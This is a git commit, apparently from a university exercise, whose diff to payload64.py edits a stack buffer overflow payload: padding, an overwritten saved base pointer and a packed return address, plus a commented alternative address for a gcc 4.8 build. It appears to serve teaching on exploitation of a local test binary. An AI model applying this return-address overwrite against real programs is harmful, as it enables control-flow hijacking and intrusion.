4f5f5b8f5f0f8d1f67e22bf8db692ea828a36f05
bnlrnz <lorenzb@tu-freiberg.de>
2021-02-07 14:39:31 +0100

    payload for old gcc version

--- payload64.py
+++ payload64.py
@@ -2,5 +2,6 @@ import struct
 padding = "A"*32
 rbp = "BBBBBBBB"
 rip = struct.pack("L", 0x555555555159) #running from gdb only!
+#rip = struct.pack("L", 0x4005a6) #running the gcc4.8 binary with this!
 
 print padding + rbp + rip
